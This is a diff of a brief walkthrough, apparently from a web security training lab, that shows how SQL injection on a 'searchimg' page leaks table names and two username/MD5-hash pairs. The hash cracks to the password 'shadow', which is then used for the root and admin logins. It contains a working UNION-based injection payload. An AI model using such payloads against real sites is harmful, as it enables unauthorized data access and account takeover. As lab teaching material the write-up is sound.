@@ -1,4 +1,4 @@
-Those SQL Injections can be done in http://10.13.0.186/?page=searchimg
+Those SQL Injections can be done in http://<ip>/?page=searchimg
 
 Make those SQL Injections to find table structure and databases :
 1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables
@@ -19,6 +19,5 @@ We get 2 combinaison username:password :
 - root:3bf1114a986ba87ed28fc1b5884fc2f8
 - admin:3bf1114a986ba87ed28fc1b5884fc2f8
 
-We md5 decode the password, we get the root:shadow combinaison than we can try in Sign In page.
-
-http://10.13.0.186/?page=signin
+We md5 decode the password, we get the root:shadow and admin:shadow combinaisons than we can try in Sign In page:
+http://<ip>/?page=signin
